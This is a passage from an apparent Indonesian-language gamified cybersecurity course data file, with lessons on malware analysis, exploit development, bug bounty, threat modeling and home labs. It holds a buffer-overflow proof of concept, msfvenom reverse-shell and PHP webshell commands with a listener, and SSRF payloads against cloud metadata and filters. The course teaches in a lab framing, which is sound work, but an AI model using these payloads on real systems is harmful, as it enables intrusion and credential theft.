strings suspicious.exe | head -50

# PE header analysis (Windows exe)
pefile suspicious.exe
pecheck suspicious.exe

# Hash untuk VirusTotal lookup
md5sum suspicious.exe
sha256sum suspicious.exe
# Cek di: virustotal.com

# Extract strings yang bermakna
strings -n 8 suspicious.exe | grep -E "(http|ftp|cmd|powershell|registry)"

# YARA rule scanning
yara -r malware_rules.yar suspicious.exe

# PEiD — detect packer/compiler
# Detect: UPX, MPRESS, Themida, etc.
upx -d packed_malware.exe   # unpack UPX`,
      explanation:'• strings: ekstrak text yang readable dari binary\n• PE header: import table sering bocorkan fungsi berbahaya\n• YARA: bahasa rule untuk pattern matching malware\n• SELALU di VM isolated! Jangan di host OS',
      simulation:['[strings] Interesting strings found:','  http://malware-c2.ru/beacon','  cmd.exe /c net user hacker Password1 /add','  HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run','[VirusTotal] 47/72 engines detected this file','[YARA] Rule matched: Emotet_Loader'],
      xp:110, helper:'security'
    }),
    () => ({
      type:'command', title:'Dynamic Malware Analysis',
      desc:'Analisis perilaku malware dengan menjalankannya di sandbox yang terisolasi.',
      code:`# SETUP: FlareVM atau REMnux di VM isolated
# Snapshot dulu! Putuskan dari network (host-only)

# Monitor proses dengan Process Monitor (Sysinternals)
# Filter: Operation contains "WriteFile" atau "RegSetValue"

# Monitor network dengan Wireshark
wireshark -i "Ethernet" -f "not arp"

# Monitor registry changes
reg export HKLM\\Software before.reg
# Jalankan malware...
reg export HKLM\\Software after.reg
diff before.reg after.reg

# Monitor file system changes
# Gunakan: Process Monitor filter pada Path

# Cuckoo Sandbox (otomatis)
cuckoo submit suspicious.exe
# Lihat report di: http://localhost:8080

# Any.run (online sandbox)
# Upload ke: app.any.run
# Gratis untuk public samples`,
      explanation:'• Dynamic analysis: lihat APA yang dilakukan malware saat berjalan\n• Sandbox: lingkungan terisolasi yang bisa direset\n• IOC yang didapat: C2 URL, file yang dibuat, registry key\n• Cuckoo: open source sandbox yang powerful',
      simulation:['[Cuckoo] Analyzing suspicious.exe...','[Network] DNS query: malware-c2.ru -> 185.220.101.5','[Network] POST http://185.220.101.5/beacon (every 60s)','[Registry] Created: HKCU\\Run\\WindowsUpdate = suspicious.exe','[File] Created: C:\\Windows\\System32\\svchost32.exe','[!] VERDICT: MALICIOUS - Trojan.Beacon'],
      xp:120, helper:'security'
    }),
    () => ({
      type:'script', title:'Python YARA Rule Generator',
      desc:'Buat YARA rule untuk mendeteksi malware berdasarkan string yang ditemukan.',
      code:`#!/usr/bin/env python3
"""YARA Rule Generator dari strings malware"""
import re, hashlib

def extract_iocs(filepath):
    """Extract IOC dari file malware"""
    iocs = {'urls': [], 'ips': [], 'registry': [], 'strings': []}
    try:
        with open(filepath, 'rb') as f:
            content = f.read()
        text = content.decode('utf-8', errors='ignore')

        # URLs
        urls = re.findall(r'https?://[\w\-\.]+(?:/[\w\-\./?=&%]*)?', text)
        iocs['urls'] = list(set(urls))[:5]

        # IPs
        ips = re.findall(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', text)
        iocs['ips'] = [ip for ip in set(ips) if not ip.startswith(('127.','10.','192.168.'))][:5]

        # Registry keys
        regs = re.findall(r'HKEY_[A-Z_]+\\[\w\\]+', text)
        iocs['registry'] = list(set(regs))[:3]

        # Interesting strings (4+ chars, printable)
        strs = re.findall(r'[A-Za-z0-9_\-\.]{8,30}', text)
        suspicious = [s for s in strs if any(k in s.lower() for k in ['cmd','exec','shell','download','beacon','inject'])]
        iocs['strings'] = suspicious[:5]
    except Exception as e:
        print(f"Error: {e}")
    return iocs

def generate_yara(malware_name, iocs, file_hash):
    rule = f"""rule {malware_name} {{
    meta:
        description = "Detects {malware_name}"
        author = "Security Analyst"
        hash = "{file_hash}"
    strings:"""
    for i, url in enumerate(iocs['urls']):
        rule += f'\n        $url{i} = "{url}"'
    for i, s in enumerate(iocs['strings']):
        rule += f'\n        $str{i} = "{s}" nocase'
    rule += '\n    condition:\n        any of them\n}'
    return rule

# Demo
iocs = {'urls': ['http://malware-c2.ru/beacon'], 'ips': ['185.220.101.5'],
        'registry': ['HKEY_CURRENT_USER\\Software\\Run'], 'strings': ['cmd.exe /c', 'shell32']}
rule = generate_yara("Trojan_Beacon", iocs, "a3f9d2b4c1e8f7a0")
print(rule)`,
      explanation:'• YARA: standar industri untuk malware detection\n• IOC: Indicator of Compromise — bukti infeksi\n• Rule yang baik: spesifik (tidak false positive) tapi robust\n• Tools: VirusTotal, MISP, TheHive menggunakan YARA',
      simulation:['[*] Extracting IOCs from sample...','[+] URLs: http://malware-c2.ru/beacon','[+] IPs: 185.220.101.5','[+] Strings: cmd.exe /c, shell32','[+] Generated YARA rule: Trojan_Beacon','[*] Testing rule against 100 clean files: 0 false positives'],
      xp:130, helper:'scripting'
    }),
  ],

  // ─── 12. EXPLOIT DEVELOPMENT ─────────────────────────────────
  exploit: [
    () => ({
      type:'script', title:'Buffer Overflow — Basic PoC',
      desc:'Konsep dasar buffer overflow dan cara membuat proof-of-concept exploit.',
      code:`#!/usr/bin/env python3
"""Buffer Overflow PoC — Educational Purpose Only"""
import socket, struct

TARGET_IP = "192.168.1.100"
TARGET_PORT = 9999

# Step 1: Find crash point (fuzzing)
def fuzz():
    buf = b"A" * 100
    for i in range(20):
        buf += b"A" * 100
        try:
            s = socket.socket()
            s.connect((TARGET_IP, TARGET_PORT))
            s.send(b"OVERFLOW " + buf)
            s.close()
            print(f"[*] Sent {len(buf)} bytes — no crash")
        except:
            print(f"[!] CRASHED at {len(buf)} bytes!")
            return len(buf)
    return -1

# Step 2: Find EIP offset (dengan cyclic pattern)
# Gunakan: msf-pattern_create -l <crash_len>
# Setelah crash, lihat EIP value
# msf-pattern_offset -q <EIP_value>

# Step 3: Proof of Concept
def exploit():
    offset = 1978        # dari pattern offset
    eip = struct.pack("<I", 0xdeadbeef)  # akan diganti JMP ESP
    nop_sled = b"\\x90" * 16
    # shellcode di sini (msfvenom generated)
    shellcode = b"\\xcc" * 100  # INT3 breakpoint untuk testing

    payload = b"OVERFLOW "
    payload += b"A" * offset
    payload += eip
    payload += nop_sled
    payload += shellcode

    s = socket.socket()
    s.connect((TARGET_IP, TARGET_PORT))
    s.send(payload)
    s.close()
    print(f"[*] Payload sent: {len(payload)} bytes")

fuzz()`,
      explanation:'• Buffer overflow: overwrite EIP untuk kontrol program flow\n• cyclic pattern: temukan exact offset ke EIP\n• NOP sled: area aman sebelum shellcode\n• Pelajari di: protostar, exploit.education (legal lab)',
      simulation:['[*] Sent 100 bytes — no crash','[*] Sent 500 bytes — no crash','[*] Sent 1000 bytes — no crash','[*] Sent 2000 bytes — no crash','[!] CRASHED at 2100 bytes!','[*] Offset found: 1978'],
      xp:130, helper:'scripting'
    }),
    () => ({
      type:'command', title:'Msfvenom Shellcode Generation',
      desc:'Generate shellcode dengan msfvenom untuk berbagai payload dan platform.',
      code:`# Generate Windows reverse shell (staged)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f exe -o shell.exe

# Generate Python shellcode (untuk BoF exploit)
msfvenom -p windows/shell_reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -b "\\x00\\x0a\\x0d" \
  -f python -v shellcode

# Generate Linux reverse shell
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f elf -o shell

# Generate PHP webshell
msfvenom -p php/meterpreter_reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f raw -o shell.php

# List semua payload tersedia
msfvenom -l payloads | grep windows/x64

# Setup listener di Metasploit
msf6 > use multi/handler
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.1.50
msf6 > set LPORT 4444
msf6 > run`,
      explanation:'• -p: pilih payload\n• -b: bad characters yang harus dihindari (tergantung vuln)\n• -f: format output (exe, elf, python, raw, dll)\n• staged vs stageless: staged lebih kecil, perlu handler\n• HANYA untuk lab/authorized pentest!',
      simulation:['msfvenom generating payload...','[-] No platform was selected, choosing Msf::Module::Platform::Windows','[-] No arch selected, selecting arch: x64','No encoder specified, outputting raw payload','Payload size: 510 bytes','[+] shell.exe saved (73216 bytes)','[*] Started reverse TCP handler on 192.168.1.50:4444'],
      xp:120, helper:'security'
    }),
    () => ({
      type:'concept', title:'CVE Research & Exploit Lifecycle',
      desc:'Pahami alur dari penemuan vulnerability hingga exploit tersedia di publik.',
      code:`# CVE LIFECYCLE

# 1. DISCOVERY
# Researcher menemukan bug di software
# Contoh: SQL injection di WordPress plugin

# 2. RESPONSIBLE DISCLOSURE
# Lapor ke vendor SEBELUM publish
# Biasanya 90 hari untuk vendor fix (Google Project Zero policy)

# 3. CVE ASSIGNMENT
# MITRE assign CVE ID: CVE-YYYY-NNNNN
# NVD (nvd.nist.gov) publish detail + CVSS score

# CVSS SCORING (0-10)
# CVSS 9.0-10.0 = Critical
# CVSS 7.0-8.9  = High
# CVSS 4.0-6.9  = Medium
# CVSS 0.1-3.9  = Low

# 4. PATCH RELEASE
# Vendor release security update
# Users harus update ASAP

# 5. EXPLOIT AVAILABLE
# PoC publish di GitHub/Exploit-DB
# searchsploit log4j 2021
# searchsploit -m 50592  # copy exploit ke current dir

# CARA CEK CVE
# nvd.nist.gov/vuln/search
# cvedetails.com
# exploit-db.com
# github.com/search?q=CVE-2021-44228`,
      explanation:'• Responsible disclosure melindungi pengguna\n• CVSS: standar scoring severity vulnerability\n• Exploit-DB: database publik exploit yang telah diverifikasi\n• Patch Tuesday: Microsoft release patch setiap Selasa kedua bulan',
      simulation:['[+] CVE-2021-44228 (Log4Shell) Details:','    CVSS Score: 10.0 (CRITICAL)','    Affected: Apache Log4j 2.0-2.14.1','    Impact: Remote Code Execution','[searchsploit] Found 12 exploits for log4j','    51183 - Log4Shell RCE PoC (Python)','    51184 - Log4Shell Scanner'],
      xp:85, helper:'security'
    }),
  ],

  // ─── 13. BUG BOUNTY ──────────────────────────────────────────
  bugbounty: [
    () => ({
      type:'concept', title:'Bug Bounty Methodology',
      desc:'Metodologi sistematis untuk hunting bug bounty yang efektif.',
      code:`# BUG BOUNTY WORKFLOW

# 1. RECON (paling penting!)
subfinder -d target.com | httpx -o live_hosts.txt
amass enum -d target.com -o amass_results.txt
assetfinder --subs-only target.com

# 2. FINGERPRINTING
cat live_hosts.txt | httpx -tech-detect -status-code -title

# 3. CONTENT DISCOVERY
ffuf -w wordlist.txt -u https://target.com/FUZZ -mc 200,301,302,403

# 4. PARAMETER DISCOVERY
paramspider --domain target.com
arjun -u https://target.com/api

# 5. VULNERABILITY TESTING (berdasarkan teknologi)
# PHP → LFI, RCE, SQLi
# Node.js → Prototype Pollution, ReDOS
# Java → Deserialization, XXE

# 6. FOKUS HIGH IMPACT
#    IDOR → akses data user lain
#    SSRF → akses internal services
#    RCE  → eksekusi kode di server (paling berharga!)
#    Auth Bypass → skip autentikasi

# 7. REPORT YANG BAIK
#    CVSS score, impact, PoC steps yang reproducible`,
      explanation:'• Recon adalah 70% dari bug bounty success\n• Subdomain discovery sering uncover forgotten assets\n• IDOR dan SSRF adalah bug paling sering ditemukan\n• Laporan yang jelas = bounty yang cepat dibayar',
      simulation:['[subfinder] Found 234 subdomains','[httpx] 89 live hosts','[ffuf] /admin (200), /api/v2 (200), /.git (200)','[!] IDOR found: /api/user/1234 → change to /api/user/1235','[+] Potential bounty: $500 - $2000 (P3 severity)'],
      xp:95, helper:'webpentest'
    }),
    () => ({
      type:'concept', title:'Bug Bounty Report Template',
      desc:'Template laporan bug bounty yang profesional dan mudah dibayar.',
      code:`# BUG BOUNTY REPORT TEMPLATE

## Title
IDOR in /api/v1/users/{id} Allows Access to Other Users' Data

## Summary
Unauthenticated (or low-privilege) user can access any user's
private data by changing the {id} parameter in the request.

## Severity
High (CVSS 8.1) — IDOR leading to PII exposure

## Steps to Reproduce
1. Login as user A (user_id: 1234)
2. Intercept request to GET /api/v1/users/1234/profile
3. Change 1234 to 1235 (another user's ID)
4. Response contains user B's email, phone, and address

## Proof of Concept
Request:
  GET /api/v1/users/1235/profile HTTP/1.1
  Authorization: Bearer eyJhbGc...

Response:
  {"id":1235,"email":"victim@example.com","phone":"08123456789"}

## Impact
Attacker can enumerate all user IDs and extract PII data
of potentially millions of users.

## Remediation
1. Validate that authenticated user owns requested resource
2. Use opaque/random IDs instead of sequential integers
3. Add authorization middleware on all /api/v1/users/* endpoints

## References
- OWASP IDOR: https://owasp.org/www-project-web-security-testing-guide/`,
      explanation:'Laporan yang baik = bounty cepat dibayar dan lebih besar. Sertakan: judul yang jelas, langkah yang reproducible, PoC nyata, impact yang konkret, dan saran perbaikan.',
      simulation:['[HackerOne] Submitting report...','[+] Report #1847293 created','[Program] Triaged: Confirmed IDOR vulnerability','[Program] Severity upgraded to High (P2)','[+] Bounty awarded: $1,500 USD','[+] Hall of Fame: Added to program leaderboard'],
      xp:80, helper:'webpentest'
    }),
    () => ({
      type:'command', title:'IDOR & SSRF Testing Techniques',
      desc:'Teknik testing IDOR dan SSRF — dua bug paling sering di bug bounty.',
      code:`# ═══ IDOR TESTING ═══

# 1. Identifikasi semua endpoint dengan ID
# /api/users/123  /invoices/456  /documents/789

# 2. Test dengan ID lain (user kedua)
curl -H "Authorization: Bearer TOKEN_USER_A" \
  https://api.target.com/v1/users/USER_B_ID/data

# 3. Test UUID (jangan asumsikan aman!)
# UUID versi 1 bisa diprediksi dari timestamp

# 4. Horizontal vs Vertical IDOR
# Horizontal: user A akses data user B (same privilege)
# Vertical: user akses data admin

# ═══ SSRF TESTING ═══

# 1. Cari parameter yang menerima URL
# ?url=  ?img=  ?webhook=  ?callback=  ?redirect=

# 2. Test internal services
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"
# AWS metadata endpoint — sering bocorkan IAM credentials!

# 3. Bypass filter SSRF
https://target.com/fetch?url=http://127.0.0.1
https://target.com/fetch?url=http://[::1]
https://target.com/fetch?url=http://0.0.0.0
https://target.com/fetch?url=http://attacker.com@127.0.0.1

# 4. Out-of-band SSRF (pakai Burp Collaborator / interactsh)
python3 -m interactsh-client
https://target.com/fetch?url=https://YOUR-INTERACTSH-URL`,
      explanation:'• IDOR: selalu test semua ID di semua HTTP method (GET/POST/PUT/DELETE)\n• SSRF: AWS metadata 169.254.169.254 adalah target utama\n• Bypass: filter "localhost" tidak berarti aman dari semua SSRF vector\n• interactsh: alternatif gratis dari Burp Collaborator',
      simulation:['[IDOR Test] GET /api/orders/1001 (own order) -> 200 OK','[IDOR Test] GET /api/orders/1002 (other user) -> 200 OK!','[!] IDOR CONFIRMED: Can access other users orders','[SSRF Test] fetch?url=http://169.254.169.254/latest/meta-data/','[!] Response: ami-id, hostname, iam/security-credentials/','[!] SSRF CONFIRMED: AWS metadata accessible!'],
      xp:100, helper:'webpentest'
    }),
  ],

  // ─── 14. THREAT MODELING ─────────────────────────────────────
  threatmodel: [
    () => ({
      type:'concept', title:'MITRE ATT&CK Framework',
      desc:'Gunakan MITRE ATT&CK untuk threat modeling dan deteksi serangan.',
      code:`# MITRE ATT&CK — 14 Taktik (urutan kill chain)

TA0043 Reconnaissance      : Gather info sebelum serangan
TA0042 Resource Development: Siapkan infrastruktur
TA0001 Initial Access      : Masuk ke target (phishing, exploit publik)
TA0002 Execution           : Jalankan kode berbahaya
TA0003 Persistence         : Pastikan akses tetap ada (cron, registry)
TA0004 Privilege Escalation: Naik ke admin/root
TA0005 Defense Evasion     : Hindari deteksi (obfuscation, timestomp)
TA0006 Credential Access   : Curi credentials (mimikatz, keylogger)
TA0007 Discovery           : Recon internal network
TA0008 Lateral Movement    : Gerak ke sistem lain (pass-the-hash)
TA0009 Collection          : Kumpulkan data target
TA0011 Command & Control   : Komunikasi dengan malware
TA0010 Exfiltration        : Kirim data keluar
TA0040 Impact              : Ransomware, wipe, disrupt

# Mapping ke detection
# navigator.attack.mitre.org — visualisasi coverage`,
      explanation:'ATT&CK dipakai oleh Red Team (simulasi serangan), Blue Team (buat detection rules), dan management (risk assessment). Hafalkan 14 taktik ini untuk wawancara kerja cyber security.',
      simulation:['[MITRE] Threat Actor: APT29 (Cozy Bear)','[TA0001] Initial Access: Spearphishing (T1566.001)','[TA0003] Persistence: Registry Run Key (T1547.001)','[TA0006] Credential Access: LSASS Memory (T1003.001)','[TA0008] Lateral Movement: Pass the Hash (T1550.002)'],
      xp:80, helper:'security'
    }),
    () => ({
      type:'concept', title:'Cyber Kill Chain',
      desc:'Pahami 7 fase Cyber Kill Chain untuk deteksi dan pencegahan serangan.',
      code:`# CYBER KILL CHAIN — 7 Fase (Lockheed Martin)

# FASE 1: RECONNAISSANCE
# Attacker kumpulkan info target
# Passive: OSINT, LinkedIn, Shodan, Google dorking
# Active: port scan, DNS enum
# Detect: honeypots, unusual recon activity in logs

# FASE 2: WEAPONIZATION
# Buat exploit + payload (malware, phishing doc)
# Combine exploit dengan backdoor
# Detect: threat intel feeds

# FASE 3: DELIVERY
# Kirim weapon ke target
# Phishing email, drive-by download, USB drop
# Detect: email filtering, web proxy logs

# FASE 4: EXPLOITATION
# Trigger exploit di sistem target
# Detect: IDS/IPS, EDR alerts, patch management

# FASE 5: INSTALLATION
# Install backdoor/persistence mechanism
# Registry run key, cron job, service
# Detect: file integrity monitoring, EDR

# FASE 6: C2 (Command & Control)
# Establish komunikasi balik ke attacker
# HTTP/HTTPS, DNS tunneling, encrypted channel
# Detect: DNS anomaly, unusual outbound traffic

# FASE 7: ACTIONS ON OBJECTIVES
# Data exfiltration, ransomware, sabotage
# Detect: DLP, unusual data transfer volume`,
      explanation:'Kill Chain berguna untuk menentukan di fase mana serangan bisa dihentikan. Semakin awal dihentikan (fase 1-3), semakin kecil dampaknya. Blue Team harus punya deteksi di setiap fase.',
      simulation:['[Kill Chain Analysis] Incident 2024-001','Phase 1: Recon - LinkedIn scraping detected','Phase 3: Delivery - Phishing email blocked (90%)','Phase 3: Delivery - 1 user opened attachment','Phase 5: Install - Endpoint Protection BLOCKED','[+] Kill chain disrupted at Phase 5'],
      xp:75, helper:'security'
    }),
    () => ({
      type:'concept', title:'Penetration Testing Methodology',
      desc:'Metodologi standar penetration testing dari perencanaan hingga laporan.',
      code:`# PENETRATION TESTING PHASES

# ══ FASE 1: PLANNING & SCOPING ══
# - Definisikan scope (IP range, domain, aplikasi)
# - Rules of Engagement (RoE): waktu, metode yang diizinkan
# - Tanda tangan Authorization Letter
# - Tentukan tipe test: black/gray/white box

# ══ FASE 2: RECONNAISSANCE ══
# Passive: OSINT, Shodan, Google dorking
# Active: nmap, nikto, subdomain enum

# ══ FASE 3: SCANNING & ENUMERATION ══
nmap -sV -sC -p- -T4 --open 192.168.1.0/24
gobuster dir -u https://target.com -w wordlist.txt
nikto -h https://target.com

# ══ FASE 4: EXPLOITATION ══
# Coba exploit vulnerability yang ditemukan
# Dokumentasi SETIAP langkah + screenshot
# Minimal impact: jangan hapus data, jangan DoS

# ══ FASE 5: POST-EXPLOITATION ══
# Privilege escalation
# Lateral movement (simulasi APT)
# Persistence (dokumentasi saja, bersihkan setelah)
# Data exfiltration simulation

# ══ FASE 6: REPORTING ══
# Executive Summary (untuk manajemen non-teknis)
# Technical Findings (untuk IT/dev team)
# Risk rating per temuan (Critical/High/Medium/Low)
# Remediation recommendations dengan prioritas`,
      explanation:'Metodologi yang sistematis memastikan tidak ada yang terlewat dan hasil pentest bisa direproduksi. Dokumentasi SANGAT penting — tanpa bukti, temuan tidak akan dipercaya.',
      simulation:['[Pentest] Target: 192.168.1.0/24','Phase 2: 8 live hosts discovered','Phase 3: 23 open services found','Phase 4: Exploited CVE-2021-34527 on 192.168.1.10','Phase 5: Domain Admin obtained in 4 hops','Phase 6: Report generated (34 findings, 3 Critical)'],
      xp:90, helper:'security'
    }),
  ],

  // ─── 15. REPUTASI ────────────────────────────────────────────
  reputation: [
    () => ({
      type:'concept', title:'CTF Strategy & Writeup',
      desc:'Strategi mengikuti CTF (Capture The Flag) dan cara menulis writeup yang baik.',
      code:`# CTF CATEGORIES & TOOLS

# Web
# Tools: Burp Suite, SQLMap, ffuf, wfuzz
# Common: SQLi, XSS, IDOR, LFI/RFI, SSRF, JWT exploit

# Pwn (Binary Exploitation)
# Tools: pwntools, GDB+peda, ghidra, IDA Free
# Common: Buffer overflow, format string, heap exploit

# Reverse Engineering
# Tools: Ghidra, radare2, x64dbg, strings, ltrace/strace
# Common: Crackme, Anti-debug, obfuscated code

# Crypto
# Tools: CyberChef, SageMath, dcode.fr
# Common: Caesar, Vigenere, RSA weak params, XOR

# Forensics
# Tools: Autopsy, Volatility, Wireshark, binwalk, steghide
# Common: Disk image, memory dump, network capture, steganography

# OSINT
# Tools: Maltego, Shodan, theHarvester, OSINT Framework
# Common: Find hidden info from public sources

# WRITEUP STRUCTURE
# 1. Challenge description & category
# 2. Initial analysis
# 3. Step-by-step solution dengan screenshots
# 4. Flag
# 5. Lessons learned`,
      explanation:'CTF adalah cara terbaik membangun portofolio dan skill. Mulai dari CTF Time (ctftime.org), ikut PicoCTF untuk pemula. Writeup di blog = portofolio nyata untuk lamaran kerja.',
      simulation:['[CTF] PicoCTF 2024 — Web Category','[Challenge] SQL Injection Level 1','[*] Trying: admin\' --','[*] Login successful!','[+] Flag: picoCTF{sql_1nj3ct10n_b4s1cs_4a3f9d}','[+] 200 points earned! Rank: 342/8921'],
      xp:50, helper:'security'
    }),
    () => ({
      type:'concept', title:'Membangun Portofolio Cyber Security',
      desc:'Cara membangun portofolio yang menarik untuk lamaran kerja cyber security.',
      code:`# PORTFOLIO CYBER SECURITY — Checklist

# ══ GITHUB PROFILE ══
# README.md yang menarik dengan:
# - Bio singkat dan spesialisasi
# - Stats: github-readme-stats
# - Skills badges
# - Link ke writeups & projects

# ══ BLOG / WRITEUP ══
# Platform: Medium, Ghost, GitHub Pages, Notion
# Isi yang bagus:
# - HTB/THM machine writeup (setelah machine retired)
# - CTF writeup dengan penjelasan detail
# - Research: vulnerability analysis
# - Tools: open source tool yang kamu buat

# ══ CERTIFICATIONS ══
# Masukkan di LinkedIn & Resume:
# CompTIA Security+ → entry level
# CEH → recognized tapi lebih ke compliance
# OSCP → paling dihormati untuk pentest
# CISSP → untuk senior/management

# ══ BUG BOUNTY HALL OF FAME ══
# HackerOne, Bugcrowd, Intigriti
# Screenshot Hall of Fame sebagai bukti

# ══ GITHUB PROJECTS ══
git init my-security-tool
# Ideas: port scanner, subdomain enum, log analyzer
# Dokumentasi README yang bagus
# MIT License

# ══ LINKEDIN ══
# Headline: "Penetration Tester | Bug Bounty Hunter | OSCP"
# Featured: artikel, sertifikat, Hall of Fame screenshot`,
      explanation:'Portofolio yang kuat lebih penting dari ijazah untuk kerja di cyber security. Perusahaan ingin lihat BUKTI kemampuan, bukan hanya klaim.',
      simulation:['[LinkedIn] Profile views this week: +340%','[HackerOne] New submission recognized','[GitHub] Repository stars: 127','[Job] Interview request from CrowdStrike','[Job] Interview request from Palo Alto Networks','[Offer] Senior Penetration Tester - $120k/year'],
      xp:45, helper:'security'
    }),
    () => ({
      type:'concept', title:'Sertifikasi Roadmap Cyber Security',
      desc:'Urutan sertifikasi yang tepat dari pemula hingga expert.',
      code:`# CERTIFICATION ROADMAP

# ══ LEVEL 1: ENTRY (0-1 tahun) ══
CompTIA ITF+          → fondasi IT umum (opsional)
CompTIA A+            → hardware & OS dasar
CompTIA Network+      → networking fundamentals
CompTIA Security+     → security fundamentals (WAJIB)
eJPT (eLearnSecurity) → pentest junior, praktis & murah

# ══ LEVEL 2: INTERMEDIATE (1-2 tahun) ══
# Pilih jalur:

# RED TEAM path:
CEH (EC-Council)      → pentest metodologi (diakui korporat)
CompTIA PenTest+      → pentest standar
PNPT (TCM Security)   → praktis, report-based, recommended!

# BLUE TEAM path:
CompTIA CySA+         → SOC analyst
BTL1 (Blue Team Labs) → defensive ops, sangat praktis
Splunk Core Certified → SIEM analyst

# ══ LEVEL 3: ADVANCED (2+ tahun) ══
OSCP (Offensive Sec)  → gold standard pentest, 24h exam!
OSEP / OSED / OSWE    → spesialisasi OSCP lanjutan
CISSP                 → manajemen & arsitektur keamanan
CISM / CISA           → governance & audit

# BIAYA ESTIMASI
# Security+: $380 USD
# OSCP: $1,499 USD (lab 90 hari)
# CISSP: $699 USD
# eJPT: $200 USD (voucher)`,
      explanation:'Urutan yang benar: Security+ dulu sebagai fondasi, lalu spesialisasi sesuai jalur. OSCP adalah yang paling dihormati untuk pentest tapi butuh persiapan 6-12 bulan.',
      simulation:['[Progress] CompTIA Security+: PASSED ✓','[Progress] eJPT: PASSED ✓','[Progress] PNPT: PASSED ✓ (Score: 87%)','[Progress] OSCP: IN PROGRESS (Lab: 45/90 days)','[Job Market] OSCP holders: avg $95k-$140k/year'],
      xp:55, helper:'security'
    }),
  ],

  // ─── 16. HOME LAB ────────────────────────────────────────────
  homelab: [
    () => ({
      type:'concept', title:'Setup Home Lab dengan VirtualBox',
      desc:'Bangun home lab cyber security dengan VirtualBox untuk praktik yang aman.',
      code:`# HOME LAB SETUP — Minimum Spec
# RAM: 16GB (ideal), 8GB (minimum)
# Storage: 100GB free
# CPU: 4 core+

# VM 1: Kali Linux (Attacker)
# Download: kali.org/get-kali
# RAM: 4GB, Storage: 60GB
# Tools: pre-installed semua

# VM 2: Metasploitable 2 (Intentionally Vulnerable)
# Download: sourceforge.net/projects/metasploitable
# RAM: 512MB — banyak vuln untuk latihan

# VM 3: Windows 10/11 (Target)
# Download: Microsoft Evaluation Center (180 hari gratis)
# RAM: 4GB

# VM 4: Ubuntu Server (untuk web app lab)
# Install DVWA, WebGoat, VulnHub machines

# NETWORK SETUP
# Host-Only Network: VMs bisa saling terhubung
# NAT: VM bisa internet tapi terisolasi

# VirtualBox network config:
# File > Host Network Manager > Create > 192.168.56.0/24

# DVWA Setup di Ubuntu
git clone https://github.com/digininja/DVWA
# Config database, set security level: low → medium → high`,
      explanation:'Home lab adalah investasi terpenting. Tanpa lab, belajar cyber security seperti belajar renang tanpa kolam. Mulai dengan Kali + Metasploitable2 dulu, sudah cukup untuk berbulan-bulan.',
      simulation:['[VirtualBox] Kali Linux started (192.168.56.101)','[VirtualBox] Metasploitable2 started (192.168.56.102)','$ nmap 192.168.56.102','21/tcp open ftp (vsftpd 2.3.4 — BACKDOOR!)','23/tcp open telnet','80/tcp open http (DVWA)','3306/tcp open mysql (no password!)'],
      xp:45, helper:'networking'
    }),
    () => ({
      type:'command', title:'Docker Lab — Vulnerable Apps',
      desc:'Setup vulnerable web app dengan Docker untuk latihan web pentesting.',
      code:`# Install Docker
curl -fsSL https://get.docker.com | bash
sudo usermod -aG docker $USER

# DVWA (Damn Vulnerable Web App)
docker run -d -p 80:80 vulnerables/web-dvwa
# Buka: http://localhost/setup.php → Create/Reset DB
# Login: admin/password
# Set security: Low untuk mulai

# WebGoat (OWASP)
docker run -d -p 8080:8080 webgoat/goat-and-wolf
# Buka: http://localhost:8080/WebGoat

# Juice Shop (OWASP — modern SPA)
docker run -d -p 3000:3000 bkimminich/juice-shop
# Buka: http://localhost:3000
# 100+ challenges berbeda!

# VulnHub via Docker (beberapa)
docker run -d -p 8888:80 hmlio/vaas-cve-2014-6271
# Shellshock vulnerability

# Stop semua container lab setelah selesai
docker ps -a
docker stop $(docker ps -aq)

# Custom network untuk isolasi
docker network create --subnet=172.20.0.0/16 pentest-net`,
      explanation:'Docker jauh lebih cepat dari VM untuk lab web. Juice Shop adalah yang terbaik — realistis, modern, dan ada scoring system. Mulai dari DVWA dengan security Low.',
      simulation:['[Docker] Pulling dvwa image...','[Docker] Container started on port 80','[DVWA] SQL Injection test:','  Input: 1\' OR \'1\'=\'1','  Result: All users exposed!','[Juice Shop] Score: 3/100 challenges solved','[WebGoat] Lesson: SQL Injection - COMPLETED'],
      xp:60, helper:'networking'
    }),
    () => ({
      type:'concept', title:'VulnHub & HTB Offline Machines',
      desc:'Download dan jalankan mesin vulnerable dari VulnHub untuk latihan offline.',
      code:`# VULNHUB — Free Vulnerable VMs
# Download di: vulnhub.com
# Format: OVA (import langsung ke VirtualBox/VMware)

# RECOMMENDED untuk pemula:
# 1. Kioptrix Level 1    — klasik, BoF exploit
# 2. Mr-Robot            — CTF inspired TV show
# 3. Basic Pentesting 1  — straightforward
# 4. Stapler             — multiple entry points

# Import ke VirtualBox:
# File > Import Appliance > pilih .ova file
# Network: Host-Only (192.168.56.x)

# WORKFLOW GENERAL
# 1. Discover IP
nmap -sn 192.168.56.0/24

# 2. Full scan
nmap -sV -sC -p- 192.168.56.X

# 3. Enumerate services
# Web: gobuster / nikto
# FTP: anonymous login
# SMB: enum4linux / smbclient
# SSH: version, default creds

# 4. Search exploits
searchsploit "service version"
# atau: exploit-db.com

# 5. Get shell, escalate
# user.txt → root.txt

# TIPS: Baca hint di page VulnHub kalau stuck 30 menit
# Setelah solve, baca writeup orang lain untuk alternatif`,
      explanation:'VulnHub adalah koleksi gratis terbesar mesin vulnerable. Mulai dari yang Easy, baca walkthroughnya setelah berhasil solve untuk belajar cara lain. Setiap mesin = 1 portofolio item.',
      simulation:['[nmap] Discovering hosts on 192.168.56.0/24','[+] 192.168.56.103 is up (Mr-Robot)','[nmap] Port 80/tcp open http (WordPress)','[wpscan] Vulnerable plugin: revslider 4.2','[searchsploit] RCE via file upload available','[shell] www-data@mrrobot:/var/www$ id'],
      xp:55, helper:'networking'
    }),
  ],

  // ─── 17. ENGLISH IT ──────────────────────────────────────────
  english: [
    () => ({
      type:'concept', title:'Vocabulary IT & Cyber Security',
      desc:'Kosakata penting Bahasa Inggris yang wajib dikuasai di bidang cyber security.',
      code:`# ESSENTIAL CYBER SECURITY VOCABULARY

